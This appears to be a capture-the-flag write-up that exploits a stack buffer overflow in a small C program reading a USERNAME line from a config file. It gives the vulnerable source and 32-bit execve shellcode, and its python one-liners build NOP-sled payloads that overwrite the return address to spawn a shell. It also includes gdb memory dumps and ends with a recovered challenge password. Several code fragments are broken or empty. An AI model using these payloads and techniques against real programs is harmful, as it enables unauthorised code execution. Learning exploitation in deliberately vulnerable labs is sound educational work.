We can overflow the *username[128]* buffer with input from a user-generated config file read in chunks of *512* bytes:

```
0xbffff6a0
```

```if(strncmp(buff, "USERNAME=", 9) == 0) { cpstr(init.username, buff+9); } // buffer <= 512 bytes```

The  buffer get *chomped*. Namely *\\t*, *\\r* and *\\n* get replaced by a *null* byte.
So we have to forbid those bytes being used in our shellcode.
The problem is the instructions pointed by *EIP* get executed after leaving the function *Init* and to overwrite *EIP* we would also overwrite the file descriptor used by *fgets*. It happens to get executed one more time before the *fclose* and leaving *Init*. So we have to preserve *file* by looking up the address in the first place.

```
if(*buff == '\n' || *buff == '\r' || *buff == '\t') {
    *buff = 0;
    break;
}
```

Compiled with:


```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFER 512

struct Init
{
  char username[128];
  uid_t uid;
  pid_t pid;  
    
};

void cpstr(char *dst, const char *src)
{
  for(; *src; src++, dst++)
    {
      *dst = *src;
    }
  *dst = 0;
}
void chomp(char *buff)
{
  for(; *buff; buff++)
    {
      if(*buff == '\n' || *buff == '\r' || *buff == '\t')
	{
	  *buff = 0;
	  break;
	}
    }
}
struct Init Init(char *filename)
{
   
  FILE *file;
  struct Init init; 
  char buff[BUFFER+1];  
   
   
  if((file = fopen(filename, "r")) == NULL)
    {
      perror("[-] fopen ");
      exit(0);
    }
   printf("file add:%x\n", file);
   
  memset(&init, 0, sizeof(struct Init));
   
  init.pid = getpid();
  init.uid = getuid();
   
  while(fgets(buff, BUFFER, file) != NULL)
    {
      printf(strcmp()) //u
      if(strncmp(buff, "USERNAME=", 9) == 0)
	{
	  cpstr(init.username, buff+9);
	}
    }
  fclose(file);
  return init;
}
int main(int argc, char **argv)
{
  struct Init init;
  if(argc != 2)
    {
      printf("Usage : %s <config_file>\n", argv[0]);
      exit(0);
    }
  init = Init(argv[1]);
  printf("[+] Runing the program with username %s, uid %d and pid %d.\n", init.username, init.uid, init.pid);
   
  return 0;
}

```
Firstly, let's find the buffer address:


Let's use thi shellcode (33 bytes long)
```
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
```

```
python -c 'print("USERNAME=" + "\x90" * 103 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\xef\xbe\xad\xde" )' > config
```

Let's be sure it doesn't use *\x09*, *\x0d* or *\x0a*. It doesn't !

Let's make **EIP** point somewhere on the NOP SLED :
```
0xbffff650:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff660:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff670:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff680:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff690:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff6b0:	0x6a909090	0x5299580b	0x702d6866	0x6a52e189
0xbffff6c0:	0x622f6868	0x2f687361	0x896e6962	0x535152e3
0xbffff6d0:	0x80cde189	0xdeadbeef	0x5a5a5a5a	0xbfff0000
```

Let's modify the source code:
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFER 512

struct Init
{
  char username[128];
  uid_t uid;
  pid_t pid;  
    
};

void cpstr(char *dst, const char *src)
{
  for(; *src; src++, dst++)
    {
      *dst = *src;
    }
  *dst = 0;
}
void chomp(char *buff)
{
  for(; *buff; buff++)
    {
      if(*buff == '\n' || *buff == '\r' || *buff == '\t')
	{
	  *buff = 0;
	  break;
	}
    }
}
struct Init Init(char *filename)
{
   
  FILE *file;
  struct Init init; 
  char buff[BUFFER+1];  
   
   
  if((file = fopen(filename, "r")) == NULL)
    {
      perror("[-] fopen ");
      exit(0);
    }
  printf("%x <- file add\n", file);   
  printf("%x <- stderr addr\n", stderr);   
  memset(&init, 0, sizeof(struct Init));
   
  init.pid = getpid();
  init.uid = getuid();
   
  while(printf("file add: %x. buff add: %x\n", file, buff) && fgets(buff, BUFFER, file) != NULL)
    {
      puts("FGETS WHILE\n");
      chomp(buff);
      if(strncmp(buff, "USERNAME=", 9) == 0)
	{
          puts("CPSTR->");
	  cpstr(init.username, buff+9);
          puts("<-CPSTR\n");
	}
    }
  puts("END\n");
  fclose(file);
  puts("<-FCLOSE WORKING");
  puts("BoF->\n");
  return init;
}
int main(int argc, char **argv)
{
  struct Init init;
  if(argc != 2)
    {
      printf("Usage : %s <config_file>\n", argv[0]);
      exit(0);
    }
  init = Init(argv[1]);
  printf("[+] Runing the program with username %s, uid %d and pid %d.\n", init.username, init.uid, init.pid);
   
  return 0;
}
```

```
python -c 'print("USERNAME=" + "\x90" * 103 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x16\x4b\x80" )' > config
```

I had trouble replacing the fd because the fd address contained a \x00 so I used stdin instead and I cancel with an EOF (CTRL + D).
I can make EIP point to either init.username address or BUFF address since it got no input.

```
python -c 'print("USERNAME=" + "\x90" * 103 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\xc0\x35\xfc\xb7"+ "AAAA" * 7 + "\x53\xf6\xff\xbf" )' > config
```
I get this error but at least it seemed to work somehow:
```
process 12901 is executing new program: /bin/bash
warning: Error reading shared library list entry at 0xffffb460
[Inferior 1 (process 12901) exited normally]
(gdb) quit
```
So let's try this shellcode instead:
http://shell-storm.org/shellcode/files/shellcode-752.php

 "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

python -c 'print("USERNAME=" + "\x90" * 115 +  "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\xc0\x35\xfc\xb7"+ "AAAA" * 7 + "AAAAAAAAAAAAAAA" )' > config

*UPDATE:* I'm dumb!

python -c 'print("USERNAME=" + "\x90" * 103 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x60\xb1\x04\x08" + "\x93\xf6\xff\xbf" * 12 )' > config

(let's repeat the address because some buffers probably needed to have a real address. I didn't bother to check )

*BOOM!*


python -c 'print("USERNAME=" + "\x90" * 103 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x60\xb1\x04\x08" + "\x93\xf6\xff\xbf" * 12 )' > config


password
h8Q!2)3=9"51

--------------------------------------------------------------------------------
### Resources

*Build*
```
gcc -m32 -Wall -no-pie -fno-stack-protector -z execstack -g ch10.c -o ch10 
```

*Shellcode*
```

```